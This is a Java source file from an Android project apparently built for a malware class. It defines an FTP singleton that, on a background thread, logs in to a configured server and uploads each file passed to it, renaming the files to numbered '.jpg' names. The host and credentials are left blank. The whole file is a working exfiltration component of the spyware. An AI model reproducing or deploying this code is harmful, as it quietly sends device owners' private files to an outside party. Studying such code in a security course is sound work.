package com.malwareclass.malwareproject;

import android.graphics.Bitmap;
import android.util.Log;

import org.apache.commons.net.ftp.FTPClient;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;

/**
 * Singleton per FTP
 */
public class FTP {

    private static FTP instance;

    // credentials
    private static final String HOST = "";
    private static final String USERNAME = "";
    private static final String PASSWORD = "";

    private static final String TAG = "FTP";

    private FTP(){}

    public static FTP getInstance(){
        if (instance == null)
            instance = new FTP();
        return instance;
    }

    public void upload(final File[] files){

        Thread dlthread = new Thread() {
            public void run() {
                FTPClient client = new FTPClient();

                try {
                    client.connect(HOST, 21);
                    client.login(USERNAME, PASSWORD);
                    client.setFileType(FTPClient.BINARY_FILE_TYPE);

                    Log.d(TAG, "Trying to upload");
                    int count = 0;
                    for (File file : files) {
                        if (file.isDirectory())
                            continue;
                        try (InputStream input = new FileInputStream(file)) {
                            Log.d(TAG, "Uploading " + file.getAbsolutePath());
                            client.storeFile(count+".jpg", input);
                            count++;
                        } catch (Exception e){
                            Log.d(TAG, "exception " + e.getMessage());
                        }
                    }

                    client.disconnect();

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };
        dlthread.start();
    }
}